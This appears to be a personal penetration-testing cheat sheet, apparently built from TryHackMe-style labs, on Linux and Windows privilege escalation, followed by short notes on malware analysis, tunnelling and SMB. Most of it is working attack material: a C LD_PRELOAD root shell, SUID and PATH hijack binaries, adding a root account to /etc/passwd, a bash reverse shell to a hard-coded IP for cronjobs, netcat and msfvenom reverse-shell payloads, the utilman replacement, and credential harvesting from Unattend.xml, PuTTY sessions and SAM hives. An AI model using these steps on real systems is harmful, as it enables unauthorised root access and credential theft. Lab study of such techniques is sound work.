`find /home -name flag1.txt` | find the file names “flag1.txt” in the /home directory
`find / -type d -name config` | find the directory named config under “/”
`find / -type f -perm 0777` | find files with the 777 permissions (files readable, writable, and executable by all users)
`find / -perm a=x` | find executable files
`find /home -user frank` | find all files for user “frank” under “/home”
`find / -mtime 10` | find files that were modified in the last 10 days
`find / -atime 10` | find files that were accessed in the last 10 day
`find / -cmin -60` | find files changed within the last hour (60 minutes)
`find / -amin -60` | find files accesses within the last hour (60 minutes)
`find / -size 50M` | find files with a 50 MB size can be used with + or negative to find a file smaller or bigger than `+50M`
`find / -writable -type d 2>/dev/null` | Find world-writeable folders
`find / -perm -222 -type d 2>/dev/null` | Find world-writeable folders
`find / -perm -o w -type d 2>/dev/null` | Find world-writeable folders
`find / -perm -o x -type d 2>/dev/null` | Find world-executable folders
`find / -name perl*`
`find / -name python*`
`find / -name gcc*`
`find / -perm -u=s -type f 2>/dev/null` | Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user
`find / -type f -perm -04000 -ls 2>/dev/null` | list files that have SUID or SGID bit set | compare with gtfobins suid checked for known vuln binaries
--
**leverage application functions**
--
some applications will not have known exploits
--
for example:
apache2 can be used to leak information with  `-f` so specify alt serverconfigfile, passing etc/shadow to this param will throw an error message and leak the first line of /etc/shadow
--
**leverage LD_PRELOAD**
--
after using `sudo -l`, it may display `env_keep+=LD_PRELOAD`, this function allows any program to use shared libraries
we can generate a shared library which will be loaded and executed before the program is run
LD_PRELOAD IS IGNORED IF THE REAL USER ID IS DIFFERENT FROM THE EFFECTIVE USER ID
--
1. check for `env_keep+=LD_PRELOAD`
2. write simple c code compiled as share object (.so)
3. run program with sudo rights with LD_PRELOAD option pointing to .so file
--
c code:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
--
4. compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
5. `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
--
**leverage SUID or SGID**
--
suid allows file to be run as same privledges as the file owner
--
1. `find / -type f -perm -04000 -ls 2>/dev/null`
2. find binary that can be used for example `nano`
--
**method reading /etc/shadow**
--
1. `nano /etc/shadow` | get contents of shadow
2. `nano /etc/passwd` | get contents of passwd
3. `unshadow passwd.txt shadow.txt > passwords.txt`
4. use john to crack passwords
--
**method adding user with root priv**
--
1. `openssl passwd -1 -salt THM password1` | we need the hash value of the password we want new user to have
2. `nano /etc/passwd` | add username and salt and shell to file
3. `<user>:<hash>:0:0:root:/root:/bin/bash` | line added to /etc/passwd 
4. `su <user>` | switch to user
--
**Capabilities**
--
capabilities allow binaries to run without needin a higher privledged user
without suid set this privesc vector is not discoverable when enumerating files looking for suid
GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities
--
`getcap / -r 2>/dev/null` | list capabilities, look on gtfo bin for a way to generate a root shell
--
**Cronjobs**
--
not inherently vulnerable BUT
if script is run with elevated privledges and we can edit the script we can use this vector to escalate privledges
sometimes scripts are no longer used and deleted but the cronjob is not removed, meaning we can create a script to fill its place
check script with ls -l to make sure it is executable
--
`cat /etc/crontab` | read what cron jobs are running on the system, what user a script runs as (check who can read and write to it aswell)
`bash -i >& /dev/tcp/10.4.9.133/4444 0>&1` | add this to a .sh cronjob
`locate <script>` | test if a script still exists | if path is not defined it will look in crontab path variable, make sure to chmod script
--
**PATH**
--
can be used to hijack an application to run a script
all commands not built into the shell or not defined with an absolute path linux will search in the PATH
if we have write permissions for one of these folders in PATH we can hijack
--
1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?
--
`find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u` | list all writable folders cleanly, compare with `echo $PATH`, add `| grep <subfoler>` for specified searches with folders that may be more present in PATH variable
`export PATH=/tmp:$PATH` | mutate path to add a folder to it, usually a folder we can write to
--
walkthrough scenario:
since PATH is invoked when there is no path present when executing a command we will write a scrip that executes a command with no path, in the script we will set uid to root
1. create script
#include<unistd.h>
void main()
{
setuid(0);
setgid(0);
system("script"); // make sure script name with no path
}
2. save and compile scirpt `gcc script.c -o script -w` + `chmod u+s script` | now we have a script with suid bit set | it will look for script in PATH variable
3. find writeable folder and create a script that spawns a shell `/bin/bash` with name of the script described in previous script | may need to add a folder to PATH if cant find folder
4. run first script that calls script in writable folder
--
**NFS**
--
Network File Sharing config kept in `/etc/exports`
look for `no_root_squash` | if this is present on a writable share we can create an executable with SUID bit set and run it on target system
makesure directory is readable and writable and you can cd into directory
--
1. `cat /etc/exports` | find no_root_squash
2. `showmount -e <ip>` | execute command from attacking machine, see which folder is mountable, and was visible in the last command with no root squash
3. `mkdir /tmp/backupsonattackermachine` | create folder to me mounted
4. `mount -o rw <targetip>:/backups /tmp/backupsonattackermachine` | mount dir to target
5. add script to our backup folder `/tmp/backupsonattackermachine`:
	int main()
	{
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
	}
6. `gcc nfs.c -o nfs -w`
7. `chmod +s nfs`
these files will now be present on the target system
the nfs executable has suid bit set on the target system and runs with root privleges
--

**Windows PrivEsc**
--
look what tools there are in `c:\tools`
--
weaknesses:
misconfigs on windows services or scheduled tasks
excessive privledges assigned to user
vuln software
missing security patches
rdp `remmina rdp://<user>@<server>` 
--
**password harvesting**
--
unnattached installations, dont require user interaction but require an admin account, when people do these types of installations there may
be a file left on the system: `Unattended.xml`
locations:
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
in these files may be credentials
--
powershell history - some commnads require password as part of the command, you may find them in the powershell history
command using CMD - `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
--
`cmdkey /list` | saved credentials list
--
`runas /savecred /user:admin cmd.exe` | if you see any creds worth trying, use this command to try get a privledged shell
--
IIS misconfig - the default webserver on windows installations - config is in web.config - can store passwords for databases or configured auth mechanisms
can be found in following locations:
`C:\inetpub\wwwroot\web.config`
`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString` | quick way to find database connections in the file
--
PuTTY - ssh client found on windows - instead of specifying connection params every time users can store sessions, with ip user and other configs, it wont store password, but it will store a proxy config that include cleartext auth creds
`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s` | commands to get stored proxy credentials
any software storing passwords will have ways of retreiving them, like google chrome
--
**Scheduled tasks**
--
may find a scheduled task that lost its binary or is using a binary you can modify
--
LOOKING FOR `Task to Run` and `Run As User` PARAMS
--
`schtasks` | list all scheduled tasks on machine
`schtasks /query /tn vulntask /fo list /v` | view detailed output of a scheduled task running on machine
--
`icacls <path of file>` | to check permissions of file if we can modify it `(F)` indicates full access
--
`echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat` | editing a file on windows
`schtasks /run /tn vulntask` | running a task on windows
--
**Windows installer files (.msi) (AlwaysInstallElevated method)**
--
can be configured to run with higher privledges from any user account (even unprivledged accounts)
can allows us to generate malicious msi file to run with admin privs
--
requires two registry values to be set:
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
--
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.136.118 LPORT=LOCAL_PORT -f msi -o malicious.msi` | generates malicious msi file
--
set up handler
then run `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`
should then recieve reverse shell
--
**Service Misonfigurations**
--
windows services are managed by the Service Control Manager (SCM)
service executables implement special functions to abe able to communicate with the SCM - not any executable can be started as a service successfully
each service also specifies the user account under which the service will run on
services have a Discretionary access control list (DACL) - indicates who has permission to start, stop, pause, query status, query configuration, reconfigure service
--
`HKLM\SYSTEM\CurrentControlSet\Services\` | all service configs stored in this location (view in registry editor), image path and object name show the exe running and the service start name
--
`sc qc` | checks service configuration
--
**insecure permissions on service exe**
--
if the executable associated with a service has weak permissions that allows attacker to modify or replace, privledges can be gained of the service account easily
--
1. check icacls of service - look for (M) or (F) - check for everyone group or users group
2. create a payload with msfvenom to take its place | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-3. svc.exe`
3. serve it with python http
4. user powershell to wget the file
5. change to the directory of the service
6. `move WService.exe WService.exe.bkp` | move process to backup
7. `move C:\Users\thm-unpriv\rev-svc.exe WService.exe` | move payload to directory
8. `icacls WService.exe /grant Everyone:F` | grantfull access to all users
9. restart service | `sc stop windowsscheduler` + `sc start windowsscheduler` | USE CMD
--
**Unquoted Service Paths**
--
when we can directly write into service executables, theres a chance to force a service to run arbitrary executables by using an obsecure feature
different behaviour occurs when the service is configured to point to an "unquoted" executable (meaning the path isnt properaly quoted to acount for spaces on the command
--
when unquoted it doesnt know which binary you are trying to execute, which could be multiple
spaces are used as an argument separater unless it is a quoted string
--
for example:
`C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` becomes `C:\MyPrograms\Disk.exe`
--
it will search in order for the shortest name to the longest name to run the exe instead of failing
this gives us space to have it launch our own crafted executable
--
most services are in program files/(x86) which isnt writable for unpriv users
--
we wanna look for AD and WD permissins using `icacls` for dirs we can put out payload in
--
make a payload and put it in a writable directory, with a name like mentioned above
stop and start the service to gain a shell
--
**Insecure Service Permissions**
--
should all the above be secure there is still a chance of the service DACL to allow you to modify the configuration of a service.
then we can point to any executable with any account including system itself
--
to check for a service DACL from the commnad line you can use Accesschk from sysinternals suite - may not be included on machine
`accesschk64.exe -qlc <service>` | look for Users SERVICE_ALL_ACCESS permission, meaning any user can reconfigure the service
--
create payload and send to system with http server and wget
grant permissions with icacls
`sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem` | reconfigure
start and stop service
all steps are the same for all exploits as insecure permissions on service exe
--
**dangerous privileges**
--
**windows priv**
--
`https://github.com/gtworek/Priv2Admin` | list of exploitable privileges
--
`whoami /priv` | checks user privs
--
**common privs**
--
**SeBackup/SeRestore**
--
he SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges, this can be used to raise privileges
--
1. `run cmd as admin`
2. `whoami /priv` | look for SeBackup and serestore privs, need to be apart of the backup operators group
3. `reg save hklm\system C:\Users\THMBackup\system.hive` + `reg save hklm\sam C:\Users\THMBackup\sam.hive` | back up system and sam hashes
4. `send files to attacking machine find away with whats available, maybe netcat, maybe something else`
6. `samdump2 system.hive sam.hive > win_hashes` | extract hashes from files
7. login with pass the hash attack using impack psexec.py
--
**SeTakeOwnership**
--
allows user to take ownership of any object on the system, including files and registry keys | could be used to take ownership of a service running as SYSTEMs executable
--
we can use utilman.exe since its run with system privileges | provides ease of access in the lock screen of windows
we will replace the binary with out payload
--
1. `run cmd as admin`
2. `whoami /priv` | look for Setakeownership privilege
3. `takeown /f C:\Windows\System32\Utilman.exe` | take ownership of the exe
4. `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F` | give yourself full access to the file
5. `copy cmd.exe utilman.exe` | replace utilman with cmd
6. lock the windows screen by going to start menu and clicking the profile icon and click lock
7. press the ease of access button on the lock menu
--
**SeImpersonate/SeAssignPrimaryToken**
--
this privilege allows a process to impersonate other users and act on their behalf
local service and network service accounts have privileges - they are used to spawn services using restricted accounts
IIS create a similar default account call iisapppool/defaultapppool for web apps
--
to elevate privileges using these account an attacker needs to
1. spawn a process that users can connect and authenticate to for impersonation to occur
2. find a way to force privileged users to connect and authenticate to the spawned malicious process
--
we can use RogueWinRM exploit to accomplish these conditions
The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM
--
1. `whoami /priv` | look for SeAssignPrimaryTokenPrivilege + SeImpersonatePrivilege
2. upload RogueWinRM exploit to the machine
3. start a listener on attacking machine
4. `c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442` | run exploit
--
**Vulnerable software**
--
**unpatched software**
--
vuln software can present privesc opportunites
drivers dont always get updated as often as the opertating system
--
`wmic product get name,version,vendor` | dump information it can gather on installed software can take awhile to execute | may not dump all software info depedning how the software is installed, check shortcuts, services or any other trace of additional software
--
use information gathered with google/exploit-db - may find a public exploit
--
**WINDOWS PRIVESC TOOLS**
--
WinPEAS
PrivescCheck | https://github.com/itm4n/PrivescCheck
WES-NG: windows exploit suggester | https://github.com/bitsadmin/wesng
If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
--

**Binary analysis**
--
`file <binary>` - gives come basic info about file, if its binary, if its used libraries etc
`ldd <binary>` - list the libraries of binaries and their path
`ltrace <binary>` - shows which functions are used within the binary
`hexdump -C <bin> | head` - displays file contents in ascii
`strings <binary>` - prints strings of printable characters in files
`readelf -h <binary>` - elf information
`objdump -d <binary>` - dumps asm instructions
`strace -f <binary>` - trace system calls and signals
`nm <binary> | tail` - list symboles from object files
`gdb -q <binary>` - GNU debugger for dynamic debugging
--

**malware analysis**
--
virus total - enter md5sum into website to search for malware
open source sandboxes (cuckoos, CAPE, both available online), any.run, intezer, hybrid analysis - SEARCH FOR SAMPLES FIRST WITH HASH BEFORE USING ONLINE BOX
no text section means malware/binary could be packaged and obfuscated meaning we will need to unpack before further analysis
--
`pecheck <binary>` - portable executable checker, gives all information about binary, including links, segments
--
**sandbox evasion**
--
`https://dl.malwarewatch.org/windows/` | windows iso for FLARE VM (install windows and then visit link inside vm `http://boxstarter.org/package/url?https://raw.githubusercontent.com/fireeye/flare-vm/master/flarevm_malware.ps1` to complete setup)
REMnux - linux reverse engineering sandbox
--
`Long sleep calls`: Malware authors know that sandboxes run for a limited time. Therefore, they program the malware not to perform any activity for a long time after execution. This is often accomplished through long sleep calls. The purpose of this technique is to time out the sandbox.
`User activity detection`: Some malware samples will wait for user activity before performing malicious activity. The premise of this technique is that there will be no user in a sandbox. Therefore there will be no mouse movement or typing on the keyboard. Advanced malware also detects patterns in mouse movements that are often used in automated sandboxes. This technique is designed to bypass automated sandbox detection.
`Footprinting user activity`: Some malware checks for user files or activity, like if there are any files in the MS Office history or internet browsing history. If no or little activity is found, the malware will consider the machine as a sandbox and quit. 
`Detecting VMs`: Sandboxes run on virtual machines. Virtual machines leave artifacts that can be identified by malware. For example, some drivers installed in VMs being run on VMWare or Virtualbox give away the fact that the machine is a VM. Malware authors often associate VMs with sandboxes and would terminate the malware if a VM is detected.
--

**Windows Malware anaylsis FLARE VM**
--
imphash - import hash, unique hash to signify the imports and libaries used in malware - this helps to identify similar malware samples when file hash fails
fuzzy hashing/SSDEEP - hashes sections of malware to find similar hashes - because malware might be strung together with different code sources that are known
yara rules - signature rules for spotting malware
capa - opensource signature tool
--
`floss --no-static-strings <binary>`- static string anaylsis for obfuscated windows binaries
`strings` - generaic static strings anaylsis
`capa <flags> <binary>` - signature detection - outlines capabilities of malware - use -v or -vv for verbose, shows memory address of functions
`ssdeep.exe <flags> <binary>` - hash comparison
--

**Windows API**
--
pinvoke http://pinvoke.net/
microsoft https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list
`windows.h` - header file for win api
--

**SSH Tunneling (Reverse SSH port forwarding)**
--
`ss -tulpn` | check for listneing sockets for port forwarding remote host
--
specifies a port on a remote server host to be forwarded to local host and port on local side
WITH PORTFORWARDING RHOST BECOMES THE ENDPOINT OF THE FORWARD, FOR EXAMPLE LOCALHOST WOULD BECOME RHOST IN MSF IF FORWARDED TO LOCALHOST
--
`ssh -L <localport>:<domain/url/localhost>:<remote port> <remote_user>@<remoteip>`
--
`-L` | local tunnel YOU <- CLIENT
`-R` | remote tunnel YOU -> CLIENT
--

**SMBCLIENT**
--
`smbclient -L <host>` | list shares
`smbclient \\\\host\\share -U user` or `smbclient //host/share -U user/user%pass` | connect to share
--

**COMMAND QUIRKS**
--
some commands that use * to affect everything in the pwd can be tricked into running flags if you make a file with touch with the flag name. this is useful if the command in run inside of a binary you cannot write to, that runs as root. checking the flags available for that command could find away to run a binary or something else.
--
